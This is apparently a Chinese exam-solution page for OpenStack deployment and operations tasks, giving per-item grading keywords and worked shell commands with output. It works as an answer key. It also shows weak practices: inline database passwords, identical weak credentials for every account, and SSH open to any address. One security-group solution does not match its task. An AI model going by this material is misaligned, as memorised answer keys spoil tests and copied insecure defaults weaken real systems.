<p><strong>标准: openstack&amp;&amp;4.0.2</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-completion.sh</span><br><span class="line">[root@compute ~]# openstack-completion.sh</span><br><span class="line"></span><br><span class="line">[root@controller ~]# openstack --version</span><br><span class="line">openstack 4.0.2</span><br></pre></td></tr></table></figure>

<h3 id="3-搭建数据库组件"><a href="#3-搭建数据库组件" class="headerlink" title="3.搭建数据库组件"></a>3.搭建数据库组件</h3><p>在controller节点执行openstack-controller-mysql.sh脚本，会自行安装mariadb、memcached、rabbitmq等服务和完成相关配置。执行完成后修改配置文件将缓存CACHESIZE修改为128,并重启相应服务。</p>
<p>将ps aux|grep memcached命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: memcached&amp;&amp;128</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行mysql脚本</span></span><br><span class="line">[root@controller ~]# openstack-controller-mysql.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改memcached缓存CACHESIZE</span></span><br><span class="line">[root@controller ~]# vim /etc/sysconfig/memcached</span><br><span class="line">PORT=&quot;11211&quot;</span><br><span class="line">USER=&quot;memcached&quot;</span><br><span class="line">MAXCONN=&quot;1024&quot;</span><br><span class="line">CACHESIZE=&quot;128&quot;</span><br><span class="line">OPTIONS=&quot;-l 127.0.0.1,::1,controller&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启服务</span></span><br><span class="line">[root@controller ~]# systemctl restart memcached</span><br><span class="line"></span><br><span class="line">[root@controller ~]# ps aux|grep memcached</span><br><span class="line">memcach+  14171  0.0  0.0 443060  2164 ?        Ssl  23:43   0:00 /usr/bin/memcached -p 11211 -u memcached -m 128 -c 1024 -l 127.0.0.1,::1,controller</span><br><span class="line">root      14186  0.0  0.0 112808   968 pts/0    S+   23:43   0:00 grep --color=auto memcached</span><br></pre></td></tr></table></figure>

<h3 id="4-搭建认证服务组件"><a href="#4-搭建认证服务组件" class="headerlink" title="4.搭建认证服务组件"></a>4.搭建认证服务组件</h3><p>在controller节点执行openstack-controller-keystone.sh脚本，会自行安装keystone服务和完成相关配置。使用openstack命令，创建一个名为tom的账户，密码为tompassword123,邮箱为<a href="mailto:&#x74;&#111;&#109;&#64;&#101;&#120;&#97;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#109;">&#x74;&#111;&#109;&#64;&#101;&#120;&#97;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#109;</a>。</p>
<p>将openstack user show tom命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: id&amp;&amp;<a href="mailto:&#116;&#x6f;&#x6d;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#x6f;&#x6d;">&#116;&#x6f;&#x6d;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#x6f;&#x6d;</a>&amp;&amp;password_expires_at</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-keystone.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建账户</span></span><br><span class="line">[root@controller ~]# source admin-openrc</span><br><span class="line">[root@controller ~]# openstack user create --password tompassword123 --email tom@example.com tom</span><br><span class="line"></span><br><span class="line">[root@controller ~]# openstack user show tom</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | default                          |</span><br><span class="line">| email               | tom@example.com                  |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| id                  | e20fb9c5f8ec4e4d98b5e1848d6c8b26 |</span><br><span class="line">| name                | tom                              |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="5-搭建镜像服务组件"><a href="#5-搭建镜像服务组件" class="headerlink" title="5.搭建镜像服务组件"></a>5.搭建镜像服务组件</h3><p>在controller节点执行openstack-controller-glance.sh脚本，会自行安装glance服务和完成相关配置。完成后使用openstack命令,创建一个qcow2格式，名为cirros_0.3.4的镜像，镜像文件使用cirros-0.3.4-x86_64-disk.img。</p>
<p>将openstack image show cirros_0.3.4命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准:  disk_format&amp;&amp;qcow2&amp;&amp;cirros_0.3.4&amp;&amp;13287936</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-glance.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建镜像</span></span><br><span class="line">[root@controller ~]# source admin-openrc</span><br><span class="line">[root@controller ~]# openstack image create --container-format bare --disk-format qcow2 --file /root/cirros-0.3.4-x86_64-disk.img --public cirros_0.3.4</span><br><span class="line"></span><br><span class="line">[root@controller ~]# openstack image show cirros_0.3.4</span><br><span class="line">+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                                                                                                                                                      |</span><br><span class="line">+------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                                                                                                                                                           |</span><br><span class="line">| container_format | bare                                                                                                                                                                                       |</span><br><span class="line">| created_at       | 2023-03-07T06:15:49Z                                                                                                                                                                       |</span><br><span class="line">| disk_format      | qcow2                                                                                                                                                                                      |</span><br><span class="line">| file             | /v2/images/07d1a62d-7d20-4564-ba78-75841308ce59/file                                                                                                                                       |</span><br><span class="line">| id               | 07d1a62d-7d20-4564-ba78-75841308ce59                                                                                                                                                       |</span><br><span class="line">| min_disk         | 0                                                                                                                                                                                          |</span><br><span class="line">| min_ram          | 0                                                                                                                                                                                          |</span><br><span class="line">| name             | cirros_0.3.4                                                                                                                                                                               |</span><br><span class="line">| owner            | de20c5e28ce6426fb23f764019b47a54                                                                                                                                                           |</span><br><span class="line">| properties       | os_hash_algo=&#x27;sha512&#x27;, os_hash_value=&#x27;1b03ca1bc3fafe448b90583c12f367949f8b0e665685979d95b004e48574b953316799e23240f4f739d1b5eb4c4ca24d38fdc6f4f9d8247a2bc64db25d6bbdb2&#x27;, os_hidden=&#x27;False&#x27; |</span><br><span class="line">| protected        | False                                                                                                                                                                                      |</span><br><span class="line">| schema           | /v2/schemas/image                                                                                                                                                                          |</span><br><span class="line">| size             | 13287936                                                                                                                                                                                   |</span><br><span class="line">| status           | active                                                                                                                                                                                     |</span><br><span class="line">| tags             |                                                                                                                                                                                            |</span><br><span class="line">| updated_at       | 2023-03-07T06:15:49Z                                                                                                                                                                       |</span><br><span class="line">| virtual_size     | None                                                                                                                                                                                       |</span><br><span class="line">| visibility       | public                 </span><br></pre></td></tr></table></figure>



<h3 id="6-搭建计算服务组件"><a href="#6-搭建计算服务组件" class="headerlink" title="6.搭建计算服务组件"></a>6.搭建计算服务组件</h3><p>在controller节点执行openstack-controller-nova.sh，compute节点执行openstack-compute-nova.sh，会自行安装nova服务和完成相关配置。使用openstack命令创建一个名为m1,ID为56，内存为2048MB,磁盘容量为20GB,vCPU数量为2的云主机类型。</p>
<p>在controller节点将openstack flavor show m1命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准:disk&amp;&amp;20&amp;&amp;name&amp;&amp;m1&amp;&amp;ram&amp;&amp;2048&amp;&amp;id&amp;&amp;56&amp;&amp;vcpus&amp;&amp;properties</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-nova.sh  </span><br><span class="line">[root@compute ~]# openstack-compute-nova.sh </span><br><span class="line">[root@controller ~]# source admin-openrc</span><br><span class="line">[root@controller ~]# openstack flavor create --id 56 --ram 2048 --disk 20 --vcpus 2 m1</span><br><span class="line">+----------------------------+-------+</span><br><span class="line">| Field                      | Value |</span><br><span class="line">+----------------------------+-------+</span><br><span class="line">| OS-FLV-DISABLED:disabled   | False |</span><br><span class="line">| OS-FLV-EXT-DATA:ephemeral  | 0     |</span><br><span class="line">| disk                       | 20    |</span><br><span class="line">| id                         | 56    |</span><br><span class="line">| name                       | m1    |</span><br><span class="line">| os-flavor-access:is_public | True  |</span><br><span class="line">| properties                 |       |</span><br><span class="line">| ram                        | 2048  |</span><br><span class="line">| rxtx_factor                | 1.0   |</span><br><span class="line">| swap                       |       |</span><br><span class="line">| vcpus                      | 2     |</span><br><span class="line">+----------------------------+-------+</span><br><span class="line"></span><br><span class="line">[root@controller ~]# openstack flavor show m1</span><br><span class="line">+----------------------------+-------+</span><br><span class="line">| Field                      | Value |</span><br><span class="line">+----------------------------+-------+</span><br><span class="line">| OS-FLV-DISABLED:disabled   | False |</span><br><span class="line">| OS-FLV-EXT-DATA:ephemeral  | 0     |</span><br><span class="line">| access_project_ids         | None  |</span><br><span class="line">| disk                       | 20    |</span><br><span class="line">| id                         | 56    |</span><br><span class="line">| name                       | m1    |</span><br><span class="line">| os-flavor-access:is_public | True  |</span><br><span class="line">| properties                 |       |</span><br><span class="line">| ram                        | 2048  |</span><br><span class="line">| rxtx_factor                | 1.0   |</span><br><span class="line">| swap                       |       |</span><br><span class="line">| vcpus                      | 2     |</span><br><span class="line">+----------------------------+-------+</span><br></pre></td></tr></table></figure>

<h3 id="7-搭建网络组件并初始化网络"><a href="#7-搭建网络组件并初始化网络" class="headerlink" title="7.搭建网络组件并初始化网络"></a>7.搭建网络组件并初始化网络</h3><p>在controller节点执行openstack-controller-neutron.sh,compute节点执行openstack-compute-neutron.sh，会自行安装neutron服务并完成配置。创建云主机外部网络ext-net，子网为ext-subnet，云主机浮动 IP 可用网段为 192.168.200.100~192.168.200.200，网关为 192.168.200.1。</p>
<p>在controller节点将openstack subnet show ext-subnet命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: 192.168.200.100-192.168.200.200&amp;&amp;allocation_pools&amp;&amp;gateway_ip&amp;&amp;192.168.200.1&amp;&amp;ext-subnet&amp;&amp;project_id</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-neutron.sh</span><br><span class="line">[root@compute ~]# openstack-compute-neutron.sh   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建网络</span></span><br><span class="line">[root@controller ~]# source admin-openrc</span><br><span class="line">[root@controller ~]# openstack network create --external ext-net</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建子网</span></span><br><span class="line">[root@controller ~]# openstack subnet create --ip-version 4 --gateway 192.168.200.1 --allocation-pool start=192.168.200.100,end=192.168.200.200 --network ext-net --subnet-range 192.168.200.0/24 ext-subnet</span><br><span class="line"></span><br><span class="line">[root@controller ~]# openstack subnet show ext-subnet</span><br><span class="line">+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Field             | Value                                                                                                                                                   |</span><br><span class="line">+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| allocation_pools  | 192.168.200.100-192.168.200.200                                                                                                                         |</span><br><span class="line">| cidr              | 192.168.200.0/24                                                                                                                                        |</span><br><span class="line">| created_at        | 2023-02-22T16:29:20Z                                                                                                                                    |</span><br><span class="line">| description       |                                                                                                                                                         |</span><br><span class="line">| dns_nameservers   |                                                                                                                                                         |</span><br><span class="line">| enable_dhcp       | True                                                                                                                                                    |</span><br><span class="line">| gateway_ip        | 192.168.200.1                                                                                                                                           |</span><br><span class="line">| host_routes       |                                                                                                                                                         |</span><br><span class="line">| id                | 6ab2ab75-3a82-44d5-9bc8-c2c0a65872d6                                                                                                                    |</span><br><span class="line">| ip_version        | 4                                                                                                                                                       |</span><br><span class="line">| ipv6_address_mode | None                                                                                                                                                    |</span><br><span class="line">| ipv6_ra_mode      | None                                                                                                                                                    |</span><br><span class="line">| location          | cloud=&#x27;&#x27;, project.domain_id=, project.domain_name=&#x27;Default&#x27;, project.id=&#x27;ce21284fd468495995218ea6e1aeea2a&#x27;, project.name=&#x27;admin&#x27;, region_name=&#x27;&#x27;, zone= |</span><br><span class="line">| name              | ext-subnet                                                                                                                                              |</span><br><span class="line">| network_id        | bc39443b-9ef8-4a4d-91b3-fd2637ada43f                                                                                                                    |</span><br><span class="line">| prefix_length     | None                                                                                                                                                    |</span><br><span class="line">| project_id        | ce21284fd468495995218ea6e1aeea2a                                                                                                                        |</span><br><span class="line">| revision_number   | 0                                                                                                                                                       |</span><br><span class="line">| segment_id        | None                                                                                                                                                    |</span><br><span class="line">| service_types     |                                                                                                                                                         |</span><br><span class="line">| subnetpool_id     | None                                                                                                                                                    |</span><br><span class="line">| tags              |                                                                                                                                                         |</span><br><span class="line">| updated_at        | 2023-02-22T16:29:20Z </span><br></pre></td></tr></table></figure>

<h3 id="8-搭建图形化界面"><a href="#8-搭建图形化界面" class="headerlink" title="8.搭建图形化界面"></a>8.搭建图形化界面</h3><p>在 controller节点执行openstack-controller-dashboard.sh脚本，会自行安装 dashboard服务并完成配置。请修改compute节点nova配置文件，使之后创建的实例可以在网页通过公网访问控制台页面。</p>
<p>在compute节点请将cat &#x2F;etc&#x2F;nova&#x2F;nova.conf | grep 公网IP 命令的返回结果提交到答题框。（例:cat &#x2F;etc&#x2F;nova&#x2F;nova.conf | grep 121.36.12.138）【1分】</p>
<p><strong>标准: novncproxy_base_url&amp;&amp;vnc_auto.html</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-dashboard.sh</span><br><span class="line">[root@compute ~]# vim /etc/nova/nova.conf</span><br><span class="line">修改内容如下</span><br><span class="line">novncproxy_base_url = http://公网IP:6080/vnc_auto.html</span><br><span class="line"></span><br><span class="line">[root@compute ~]# cat /etc/nova/nova.conf | grep 公网IP</span><br><span class="line">novncproxy_base_url = http://公网IP:6080/vnc_auto.html</span><br></pre></td></tr></table></figure>

<h2 id="任务3-OpenStack运维任务（11分）"><a href="#任务3-OpenStack运维任务（11分）" class="headerlink" title="任务3 OpenStack运维任务（11分）"></a>任务3 OpenStack运维任务（11分）</h2><p>某公司构建了一套内部私有云系统，这套私有云系统将为公司内部提供计算服务。你将作为该私有云的维护人员，请完成以下运维工作。</p>
<h3 id="1-数据库管理"><a href="#1-数据库管理" class="headerlink" title="1.数据库管理"></a>1.数据库管理</h3><p>请使用数据库命令将所有数据库备份到&#x2F;root路径下,备份文件名为openstack.sql，完成后使用命令查看文件属性其中文件大小以mb显示。</p>
<p>请将所有命令和返回结果提交到答题框。【1分】</p>
<p><strong>标准: 1.6M&amp;&amp;openstack.sql</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mysqldump -uroot -p000000 --all-databases &gt; /root/openstack.sql</span><br><span class="line">[root@controller ~]# du -h /root/openstack.sql</span><br><span class="line">1.6M    /root/openstack.sql</span><br></pre></td></tr></table></figure>

<h3 id="2-数据库管理"><a href="#2-数据库管理" class="headerlink" title="2.数据库管理"></a>2.数据库管理</h3><p>进入数据库，创建本地用户examuser，密码为 000000，然后查询mysql数据库中的 user 表的user,host,password字段。然后赋予这个用户所有数据库的“查询”“删除”“更新”“创建”的权限。</p>
<p>将select User, Select_priv,Update_priv,Delete_priv,Create_priv from user;命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: keystone&amp;&amp;glance&amp;&amp;nova&amp;&amp;placement&amp;&amp;examuser&amp;&amp;Y</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mysql -uroot -p</span><br><span class="line">MariaDB [(none)]&gt; create user examuser@&#x27;localhost&#x27; identified by &#x27;000000&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.005 sec)</span><br><span class="line">MariaDB [(none)]&gt; use mysql</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mysql]&gt; select user,host,password from user;</span><br><span class="line">+-----------+------------+-------------------------------------------+</span><br><span class="line">| user      | host       | password                                  |</span><br><span class="line">+-----------+------------+-------------------------------------------+</span><br><span class="line">| root      | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| root      | controller | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| root      | 127.0.0.1  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| root      | ::1        | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| keystone  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| keystone  | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| glance    | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| glance    | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| nova      | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| nova      | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| placement | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| placement | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| neutron   | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| neutron   | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| cinder    | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| cinder    | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| examuser  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">+-----------+------------+-------------------------------------------+</span><br><span class="line">17 rows in set (0.000 sec)</span><br><span class="line">MariaDB [mysql]&gt; grant select,delete,update,create on *.* to examuser@&#x27;localhost&#x27;; </span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line">MariaDB [mysql]&gt; select User, Select_priv,Update_priv,Delete_priv,Create_priv from user;</span><br><span class="line">+-----------+-------------+-------------+-------------+-------------+</span><br><span class="line">| User      | Select_priv | Update_priv | Delete_priv | Create_priv |</span><br><span class="line">+-----------+-------------+-------------+-------------+-------------+</span><br><span class="line">| root      | Y           | Y           | Y           | Y           |</span><br><span class="line">| root      | Y           | Y           | Y           | Y           |</span><br><span class="line">| root      | Y           | Y           | Y           | Y           |</span><br><span class="line">| root      | Y           | Y           | Y           | Y           |</span><br><span class="line">| keystone  | N           | N           | N           | N           |</span><br><span class="line">| keystone  | N           | N           | N           | N           |</span><br><span class="line">| glance    | N           | N           | N           | N           |</span><br><span class="line">| glance    | N           | N           | N           | N           |</span><br><span class="line">| nova      | N           | N           | N           | N           |</span><br><span class="line">| nova      | N           | N           | N           | N           |</span><br><span class="line">| placement | N           | N           | N           | N           |</span><br><span class="line">| placement | N           | N           | N           | N           |</span><br><span class="line">| neutron   | N           | N           | N           | N           |</span><br><span class="line">| neutron   | N           | N           | N           | N           |</span><br><span class="line">| examuser  | Y           | Y           | Y           | Y           |</span><br><span class="line">+-----------+-------------+-------------+-------------+-------------+</span><br><span class="line">15 rows in set (0.000 sec)</span><br></pre></td></tr></table></figure>

<h3 id="3-安全组管理"><a href="#3-安全组管理" class="headerlink" title="3.安全组管理"></a>3.安全组管理</h3><p>使用openstack命令创建名称为group_web的安全组该安全组的描述为”Custom security group”，用openstack命令为安全组添加icmp规则和ssh规则允许任意ip地址访问web,完成后使用openstack命令查看该安全组的详细信息。</p>
<p>将openstack security group show group_web命令的返回结果提交到答题框。【1分】</p>
<p>*<em>标准: created_at&amp;&amp;rules&amp;&amp;port_range_max&amp;&amp;22&amp;&amp;protocol&amp;&amp;icmp</em></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建描述为Custom security group的安全组</span></span><br><span class="line">[root@controller ~]# openstack security group create --description &quot;Custom security group&quot; group_web</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加访问80</span></span><br><span class="line">[root@controller ~]# openstack security group rule create --ingress --ethertype IPv4 --protocol tcp --dst-port 80:80 group_web</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加访问ssh(22)</span></span><br><span class="line">[root@controller ~]# openstack security group rule create --ingress --ethertype IPv4 --protocol tcp --dst-port 22:22 group_web</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加访问icmp</span></span><br><span class="line">[root@controller ~]# openstack security group rule create --ingress --protocol icmp group_web</span><br><span class="line">[root@controller ~]# openstack security group show group_web</span><br><span class="line">+-----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Field           | Value                                                                                                                                                                                                                                          |</span><br><span class="line">+-----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| created_at      | 2023-02-23T08:46:51Z                                                                                                                                                                                                                           |</span><br><span class="line">| description     | Custom security group                                                                                                                                                                                                                          |</span><br><span class="line">| id              | 66376557-a4b3-46ac-aae3-174b0d12d687                                                                                                                                                                                                           |</span><br><span class="line">| location        | cloud=&#x27;&#x27;, project.domain_id=, project.domain_name=&#x27;Default&#x27;, project.id=&#x27;ce21284fd468495995218ea6e1aeea2a&#x27;, project.name=&#x27;admin&#x27;, region_name=&#x27;&#x27;, zone=                                                                                        |</span><br><span class="line">| name            | group_web                                                                                                                                                                                                                                      |</span><br><span class="line">| project_id      | ce21284fd468495995218ea6e1aeea2a                                                                                                                                                                                                               |</span><br><span class="line">| revision_number | 4                                                                                                                                                                                                                                              |</span><br><span class="line">| rules           | created_at=&#x27;2023-02-23T08:48:42Z&#x27;, direction=&#x27;ingress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;3eccfa5c-3886-4873-92b5-c19e653ef2c8&#x27;, port_range_max=&#x27;80&#x27;, port_range_min=&#x27;80&#x27;, protocol=&#x27;tcp&#x27;, remote_ip_prefix=&#x27;0.0.0.0/0&#x27;, updated_at=&#x27;2023-02-23T08:48:42Z&#x27; |</span><br><span class="line">|                 | created_at=&#x27;2023-02-23T08:50:59Z&#x27;, direction=&#x27;ingress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;6ad68ada-ca6f-4905-b78a-3f53607333d8&#x27;, port_range_max=&#x27;22&#x27;, port_range_min=&#x27;22&#x27;, protocol=&#x27;tcp&#x27;, remote_ip_prefix=&#x27;0.0.0.0/0&#x27;, updated_at=&#x27;2023-02-23T08:50:59Z&#x27; |</span><br><span class="line">|                 | created_at=&#x27;2023-02-23T08:51:27Z&#x27;, direction=&#x27;ingress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;b09e5950-ee02-4531-91c8-7fcb3cc427a0&#x27;, protocol=&#x27;tcp&#x27;, remote_ip_prefix=&#x27;0.0.0.0/0&#x27;, updated_at=&#x27;2023-02-23T08:51:27Z&#x27;                                           |</span><br><span class="line">|                 | created_at=&#x27;2023-02-23T08:46:51Z&#x27;, direction=&#x27;egress&#x27;, ethertype=&#x27;IPv4&#x27;, id=&#x27;bb5ce76b-75f1-41ab-aa5b-8cb50702f9d4&#x27;, updated_at=&#x27;2023-02-23T08:46:51Z&#x27;                                                                                          |</span><br><span class="line">|                 | created_at=&#x27;2023-02-23T08:46:51Z&#x27;, direction=&#x27;egress&#x27;, ethertype=&#x27;IPv6&#x27;, id=&#x27;f52f4f79-2e9f-479f-abdf-1baee9d56f14&#x27;, updated_at=&#x27;2023-02-23T08:46:51Z&#x27;                                                                                          |</span><br><span class="line">| tags            | []                                                                                                                                                                                                                                             |</span><br><span class="line">| updated_at      | 2023-02-23T08:51:27Z </span><br></pre></td></tr></table></figure>

<h3 id="4-项目管理"><a href="#4-项目管理" class="headerlink" title="4.项目管理"></a>4.项目管理</h3><p>在 keystone 中使用openstack创建shop项目添加描述为”Hello shop”，完成后使用openstack命令禁用该项目，然后使用openstack命令查看该项目的详细信息。</p>
<p>将openstack project show shop命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: enabled&amp;&amp;False&amp;&amp;name&amp;&amp;shop</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack project create --description &quot;Hello shop&quot; shop</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description | Hello shop                       |</span><br><span class="line">| domain_id   | default                          |</span><br><span class="line">| enabled     | True                             |</span><br><span class="line">| id          | 0e37ad8443764f759f6691a1f0dbff9d |</span><br><span class="line">| is_domain   | False                            |</span><br><span class="line">| name        | shop                             |</span><br><span class="line">| options     | &#123;&#125;                               |</span><br><span class="line">| parent_id   | default                          |</span><br><span class="line">| tags        | []                               |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁用shop项目</span></span><br><span class="line">[root@controller ~]# openstack project set --disable shop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看</span></span><br><span class="line">[root@controller ~]# openstack project show shop</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description | Hello shop                       |</span><br><span class="line">| domain_id   | default                          |</span><br><span class="line">| enabled     | False                            |</span><br><span class="line">| id          | 0e37ad8443764f759f6691a1f0dbff9d |</span><br><span class="line">| is_domain   | False                            |</span><br><span class="line">| name        | shop                             |</span><br><span class="line">| options     | &#123;&#125;                               |</span><br><span class="line">| parent_id   | default                          |</span><br><span class="line">| tags        | []                               |</span><br></pre></td></tr></table></figure>

<h3 id="5-用户管理"><a href="#5-用户管理" class="headerlink" title="5.用户管理"></a>5.用户管理</h3><p>使用openstack命令查看admin租户的当前配额值、将admin租户的实例配额提升到13，然后查看修改后admin租户的配额值。</p>
<p>将openstack quota show admin命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: instances&amp;&amp;13&amp;&amp;project_name&amp;&amp;admin&amp;&amp;routers&amp;&amp;ram</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack quota show admin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改</span></span><br><span class="line">[root@controller ~]# openstack quota set --instances 13 admin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看</span></span><br><span class="line">[root@controller ~]# openstack quota show admin</span><br><span class="line">+----------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Field                | Value                                                                                                                                                                              |</span><br><span class="line">+----------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| cores                | 20                                                                                                                                                                                 |</span><br><span class="line">| fixed-ips            | -1                                                                                                                                                                                 |</span><br><span class="line">| floating-ips         | 50                                                                                                                                                                                 |</span><br><span class="line">| health_monitors      | None                                                                                                                                                                               |</span><br><span class="line">| injected-file-size   | 10240                                                                                                                                                                              |</span><br><span class="line">| injected-files       | 5                                                                                                                                                                                  |</span><br><span class="line">| injected-path-size   | 255                                                                                                                                                                                |</span><br><span class="line">| instances            | 13                                                                                                                                                                                 |</span><br><span class="line">| key-pairs            | 100                                                                                                                                                                                |</span><br><span class="line">| l7_policies          | None                                                                                                                                                                               |</span><br><span class="line">| listeners            | None                                                                                                                                                                               |</span><br><span class="line">| load_balancers       | None                                                                                                                                                                               |</span><br><span class="line">| location             | Munch(&#123;&#x27;project&#x27;: Munch(&#123;&#x27;domain_name&#x27;: &#x27;Default&#x27;, &#x27;domain_id&#x27;: None, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;id&#x27;: u&#x27;ce21284fd468495995218ea6e1aeea2a&#x27;&#125;), &#x27;cloud&#x27;: &#x27;&#x27;, &#x27;region_name&#x27;: &#x27;&#x27;, &#x27;zone&#x27;: None&#125;) |</span><br><span class="line">| name                 | None                                                                                                                                                                               |</span><br><span class="line">| networks             | 100                                                                                                                                                                                |</span><br><span class="line">| pools                | None                                                                                                                                                                               |</span><br><span class="line">| ports                | 500                                                                                                                                                                                |</span><br><span class="line">| project              | ce21284fd468495995218ea6e1aeea2a                                                                                                                                                   |</span><br><span class="line">| project_name         | admin                                                                                                                                                                              |</span><br><span class="line">| properties           | 128                                                                                                                                                                                |</span><br><span class="line">| ram                  | 51200                                                                                                                                                                              |</span><br><span class="line">| rbac_policies        | 10                                                                                                                                                                                 |</span><br><span class="line">| routers              | 10                                                                                                                                                                                 |</span><br><span class="line">| secgroup-rules       | 100                                                                                                                                                                                |</span><br><span class="line">| secgroups            | 10                                                                                                                                                                                 |</span><br><span class="line">| server-group-members | 10                                                                                                                                                                                 |</span><br><span class="line">| server-groups        | 10                                                                                                                                                                                 |</span><br><span class="line">| subnet_pools         | -1                                                                                                                                                                                 |</span><br><span class="line">| subnets              | 100</span><br></pre></td></tr></table></figure>

<h3 id="6-heat模板管理"><a href="#6-heat模板管理" class="headerlink" title="6.heat模板管理"></a>6.heat模板管理</h3><p>执行脚本openstack-controller-heat.sh安装完heat服务后，编写Heat模板create_flavor.yaml，创建名为“m2.flavor”、ID为 1234、内存为1024MB、硬盘为20GB、vcpu数量为1的云主机类型，创建完成后使用openstack命令查看堆栈列表。</p>
